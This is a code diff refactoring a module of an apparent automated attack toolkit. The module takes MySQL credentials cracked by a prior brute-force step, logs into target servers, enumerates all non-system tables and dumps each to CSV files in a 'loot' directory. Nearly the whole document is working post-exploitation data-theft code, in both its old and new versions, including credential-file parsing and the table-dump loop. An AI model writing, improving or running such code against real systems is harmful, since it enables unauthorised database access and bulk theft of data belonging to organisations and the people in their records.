@@ -1,70 +1,93 @@
-import os
-import csv
-import shutil
-import logging
-import time
-from sqlalchemy import create_engine, text
-from rich.console import Console
-from threading import Timer
-from shared import SharedData, settle_for_display
-from logger import Logger
+"""
+steal_data_sql.py - Connects to MySQL servers with cracked credentials, enumerates
+non-system tables, and dumps each to a CSV under the loot directory.
 
-# Configure the logger
+#12: scaffolding lives in base_stealer.BaseStealer. "Files" are tables; harvest is
+overridden. A successful auth with zero tables is still a cracked credential and is
+recorded as success (the login-is-the-win path).
+"""
+
+import csv
+import logging
+import os
+import re
+from sqlalchemy import create_engine, text
+
+from base_stealer import BaseStealer, MAX_FILE_BYTES, MAX_RUN_BYTES, MIN_FREE_BYTES
+from logger import Logger
+from shared import SharedData
+
 logger = Logger(name="steal_data_sql.py", level=logging.DEBUG)
 
-# Define the necessary global variables
 b_class = "StealDataSQL"
 b_module = "steal_data_sql"
 b_status = "steal_data_sql"
 b_parent = "SQLBruteforce"
 b_port = 3306
 
-# Hard caps so a giant table cannot OOM or fill a 512 MB Pi Zero (matches the ftp/smb steal caps).
-MAX_ROWS = 100_000                  # cap the SELECT so a huge table can't be pulled into RAM
-MAX_FILE_BYTES = 50 * 1024 * 1024   # 50 MB per dumped table
-MAX_RUN_BYTES = 200 * 1024 * 1024   # 200 MB per host run
-MIN_FREE_BYTES = 100 * 1024 * 1024  # refuse write if < 100 MB free
+MAX_ROWS = 100_000
 
-class StealDataSQL:
-    """
-    Class to handle the process of stealing data from SQL servers.
-    """
-    def __init__(self, shared_data):
-        try:
-            self.shared_data = shared_data
-            self.sql_connected = False
-            self.stop_execution = False
-            logger.info("StealDataSQL initialized.")
-        except Exception as e:
-            logger.error(f"Error during initialization: {e}")
 
-    def connect_sql(self, ip, username, password, database=None):
-        """
-        Establish a MySQL connection using SQLAlchemy.
-        """
+class StealDataSQL(BaseStealer):
+    """Steal table data from MySQL servers as CSVs."""
+
+    CRED_FILE_ATTR = "sqlfile"
+    LOOT_SUBDIR = "sql"
+    CONNECTED_FLAG = "sql_connected"
+    LOGGER = logger
+
+    def load_credentials(self, ip):
+        """SQL CSV may use DictReader shape (IP Address, User, Password, Database)."""
+        path = getattr(self.shared_data, self.CRED_FILE_ATTR)
+        credentials = []
+        if not os.path.exists(path):
+            return credentials
         try:
-            # Si aucune base n'est spécifiée, on se connecte sans base
-            db_part = f"/{database}" if database else ""
-            connection_str = f"mysql+pymysql://{username}:{password}@{ip}:3306{db_part}"
-            engine = create_engine(connection_str, connect_args={"connect_timeout": 10})
-            self.sql_connected = True
-            logger.info(f"Connected to {ip} via SQL with username {username}" + (f" to database {database}" if database else ""))
-            return engine
-        except Exception as e:
-            logger.error(f"SQL connection error for {ip} with user '{username}' and password '{password}'" + (f" to database {database}" if database else "") + f": {e}")
-            return None
+            with open(path, newline="", encoding="utf-8", errors="replace") as f:
+                reader = csv.DictReader(f)
+                for cred in reader:
+                    if cred.get("IP Address") == ip or cred.get("IP") == ip:
+                        credentials.append((
+                            cred.get("User", "") or cred.get("Username", ""),
+                            cred.get("Password", ""),
+                        ))
+        except Exception:
+            with open(path, 'r') as f:
+                for line in f.readlines()[1:]:
+                    parts = line.strip().split(',')
+                    if len(parts) > 4 and parts[1] == ip:
+                        credentials.append((parts[3], parts[4]))
+        seen = set()
+        unique = []
+        for pair in credentials:
+            if pair not in seen:
+                seen.add(pair)
+                unique.append(pair)
+        logger.info(f"Found {len(unique)} credentials for {ip}")
+        return unique
+
+    def open_session(self, ip, username, password):
+        connection_str = f"mysql+pymysql://{username}:{password}@{ip}:3306"
+        engine = create_engine(connection_str, connect_args={"connect_timeout": 10})
+        with engine.connect() as conn:
+            conn.execute(text("SELECT 1"))
+        self.mark_connected()
+        logger.info(f"Connected to {ip} via SQL with username {username}")
+        return engine
+
+    def close_session(self, conn):
+        try:
+            conn.dispose()
+        except Exception:
+            pass
 
     def find_tables(self, engine):
-        """
-        Find all tables in all databases, excluding system databases.
-        """
         try:
             if self.shared_data.orchestrator_should_exit:
-                logger.info("Table search interrupted due to orchestrator exit.")
                 return []
             query = text("""
-            SELECT TABLE_NAME, TABLE_SCHEMA 
-            FROM INFORMATION_SCHEMA.TABLES 
+            SELECT TABLE_NAME, TABLE_SCHEMA
+            FROM INFORMATION_SCHEMA.TABLES
             WHERE TABLE_SCHEMA NOT IN ('information_schema', 'mysql', 'performance_schema', 'sys')
             AND TABLE_TYPE = 'BASE TABLE'
             """)
@@ -77,38 +100,18 @@ class StealDataSQL:
             logger.error(f"Error finding tables: {e}")
             return []
 
-    def steal_data(self, engine, table, schema, local_dir):
-        """
-        Download data from the table in the database to a local file.
-
-        SELECT * without a LIMIT can pull a multi-GB table into RAM on a 512 MB
-        Pi Zero.  We cap rows, enforce free-space and per-run byte budgets, and
-        refuse to write if the resulting CSV would blow the cap.
-        """
+    def steal_file(self, engine, table_schema_pair, local_dir):
+        """Dump one table to CSV. table_schema_pair is (table, schema)."""
+        table, schema = table_schema_pair
+        if not self.check_budget(local_dir):
+            return
+        if self.shared_data.orchestrator_should_exit or getattr(self, 'stop_execution', False):
+            return
+        if not re.fullmatch(r'[A-Za-z0-9_$]+', schema or '') or not re.fullmatch(r'[A-Za-z0-9_$]+', table or ''):
+            logger.error(f"Refusing SQL steal of non-identifier {schema}.{table}")
+            return
+        local_file_path = None
         try:
-            if self.shared_data.orchestrator_should_exit or getattr(self, 'stop_execution', False):
-                logger.info("Data stealing process interrupted due to orchestrator exit.")
-                return
-            try:
-                free = shutil.disk_usage(local_dir if os.path.isdir(local_dir) else os.path.dirname(local_dir) or '/').free
-            except Exception:
-                free = shutil.disk_usage('/').free
-            if free < MIN_FREE_BYTES:
-                logger.error(f"Refusing SQL steal: only {free} bytes free (need {MIN_FREE_BYTES})")
-                self.stop_execution = True
-                return
-            if getattr(self, '_run_bytes', 0) >= MAX_RUN_BYTES:
-                logger.warning(f"SQL per-run byte budget ({MAX_RUN_BYTES}) exhausted; stopping")
-                self.stop_execution = True
-                return
-
-            # Identifier quoting: schema/table come from INFORMATION_SCHEMA, but we
-            # still refuse anything that is not a simple identifier.
-            import re as _re
-            if not _re.fullmatch(r'[A-Za-z0-9_$]+', schema or '') or not _re.fullmatch(r'[A-Za-z0-9_$]+', table or ''):
-                logger.error(f"Refusing SQL steal of non-identifier {schema}.{table}")
-                return
-
             query = text(f"SELECT * FROM `{schema}`.`{table}` LIMIT {MAX_ROWS}")
             os.makedirs(local_dir, exist_ok=True)
             local_file_path = os.path.join(local_dir, f"{schema}_{table}.csv")
@@ -123,139 +126,48 @@ class StealDataSQL:
                         writer.writerow(list(row))
                         row_count += 1
             size = os.path.getsize(local_file_path) if os.path.exists(local_file_path) else 0
-            if size > MAX_FILE_BYTES or getattr(self, '_run_bytes', 0) + size > MAX_RUN_BYTES:
-                logger.warning(f"SQL dump {schema}.{table} is {size} bytes — over budget, deleting")
+            if not self.fits_budget(size):
+                logger.warning(
+                    f"SQL dump {schema}.{table} is {size} bytes — over budget, deleting")
                 try:
                     os.unlink(local_file_path)
                 except OSError:
                     pass
                 self.stop_execution = True
                 return
-            self._run_bytes = getattr(self, '_run_bytes', 0) + size
+            self.note_bytes(size)
             logger.success(
                 f"Downloaded data from table {schema}.{table} to {local_file_path} "
-                f"({row_count} rows, {size} bytes)"
-            )
+                f"({row_count} rows, {size} bytes)")
         except Exception as e:
             logger.error(f"Error downloading data from table {schema}.{table}: {e}")
+            try:
+                if local_file_path and os.path.exists(local_file_path):
+                    os.unlink(local_file_path)
+            except OSError:
+                pass
 
-    def execute(self, ip, port, row, status_key):
-        """
-        Steal data from the remote SQL server.
-        """
-        try:
-            if 'success' in row.get(self.b_parent_action, ''):
-                self.shared_data.bjornorch_status = "StealDataSQL"
-                # Per-run state, reset here rather than only in __init__. These objects are
-                # long-lived singletons built once by orchestrator.load_action, so the flags
-                # latched: once the 240s timer fired for ANY host, stop_execution stayed True
-                # and every later steal on every host broke out immediately and returned
-                # 'failed' — permanently, until the service restarted. Conversely a single
-                # success left *_connected True and disarmed the timeout for good.
-                self.stop_execution = False
-                self.sql_connected = False
-                self._run_bytes = 0
-                settle_for_display(self.shared_data)  # let the panel show this action's name
-                logger.info(f"Stealing data from {ip}:{port}...")
+    def find_files(self, conn, dir_path):
+        return []
 
-                sqlfile = self.shared_data.sqlfile
-                credentials = []
-                if os.path.exists(sqlfile):
-                    with open(sqlfile, newline="", encoding="utf-8", errors="replace") as f:
-                        for cred in csv.DictReader(f):  # not `row`: that param is the host netkb row, reused at line 206
-                            if cred.get("IP Address") == ip:
-                                credentials.append((
-                                    cred.get("User", ""),
-                                    cred.get("Password", ""),
-                                    cred.get("Database", ""),
-                                ))
-                    logger.info(f"Found {len(credentials)} credential combinations for {ip}")
+    def harvest(self, conn, ip, row):
+        """Override: tables instead of files. Successful auth alone is a win (login-is-the-win)."""
+        local_dir = self.loot_dir(ip, row)
+        tables = self.find_tables(conn)
+        for table, schema in tables:
+            if getattr(self, 'stop_execution', False) or self.shared_data.orchestrator_should_exit:
+                break
+            self.steal_file(conn, (table, schema), local_dir)
+        if tables:
+            logger.success(f"Successfully stolen data from {len(tables)} tables on {ip}")
+        else:
+            logger.info(f"Authenticated to {ip} with zero non-system tables — recording as success")
+        return True
 
-                if not credentials:
-                    logger.error(f"No valid credentials found for {ip}. Skipping...")
-                    return 'failed'
-
-                # Token this run. timer.cancel() is only reached on the success path, so a failed
-                # steal leaves a live 240s timer behind; without this it would fire midway
-                # through a LATER host's steal and abort it by setting stop_execution.
-                run_token = object()
-                self._run_token = run_token
-
-                def timeout():
-                    if getattr(self, '_run_token', None) is not run_token:
-                        return  # a later execute() owns the flags now
-                    if not self.sql_connected:
-                        logger.error(f"No SQL connection established within 4 minutes for {ip}. Marking as failed.")
-                        self.stop_execution = True
-
-                timer = Timer(240, timeout)
-                timer.daemon = True  # never hold up shutdown waiting for a 4-minute timer
-                timer.start()
-
-                success = False
-                for username, password, database in credentials:
-                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
-                        logger.info("Steal data execution interrupted.")
-                        break
-                    try:
-                        logger.info(f"Trying credential {username}:{password} for {ip} on database {database}")
-                        # D'abord se connecter sans base pour vérifier les permissions globales
-                        engine = self.connect_sql(ip, username, password)
-                        if engine:
-                            tables = self.find_tables(engine)
-                            mac = row['MAC Address']
-                            local_dir = os.path.join(self.shared_data.datastolendir, f"sql/{mac}_{ip}/{database}")
-                            os.makedirs(local_dir, exist_ok=True)
-                            
-                            if tables:
-                                for table, schema in tables:
-                                    if self.stop_execution or self.shared_data.orchestrator_should_exit:
-                                        break
-                                    # Se connecter à la base spécifique pour le vol de données
-                                    db_engine = self.connect_sql(ip, username, password, schema)
-                                    if db_engine:
-                                        self.steal_data(db_engine, table, schema, local_dir)
-                                success = True
-                                counttables = len(tables)
-                                logger.success(f"Successfully stolen data from {counttables} tables on {ip}:{port}")
-                            
-                            if success:
-                                timer.cancel()
-                                return 'success'
-                    except Exception as e:
-                        logger.error(f"Error stealing data from {ip} with user '{username}' on database {database}: {e}")
-
-                if not success:
-                    logger.error(f"Failed to steal any data from {ip}:{port}")
-                    return 'failed'
-                else:
-                    return 'success'
-
-            else:
-                # 'failed', to match the four sibling steal modules. For a host action the
-                # orchestrator already gates on the parent before calling execute() and maps any
-                # non-'success' return to failed_<ts> regardless, so this is purely about removing
-                # the odd-one-out drift the four others don't have.
-                logger.info(f"Skipping {ip} as it was not successfully bruteforced")
-                return 'failed'
-                
-        except Exception as e:
-            logger.error(f"Unexpected error during execution for {ip}:{port}: {e}")
-            return 'failed'
 
 if __name__ == "__main__":
-    shared_data = SharedData()
     try:
+        shared_data = SharedData()
         steal_data_sql = StealDataSQL(shared_data)
-        logger.info("[bold green]Starting SQL data extraction process[/bold green]")
-        
-        # Load the IPs to process from shared data
-        ips_to_process = shared_data.read_data()
-        
-        # Execute data theft on each IP
-        for row in ips_to_process:
-            ip = row["IPs"]
-            steal_data_sql.execute(ip, b_port, row, b_status)
-            
     except Exception as e:
         logger.error(f"Error in main execution: {e}")
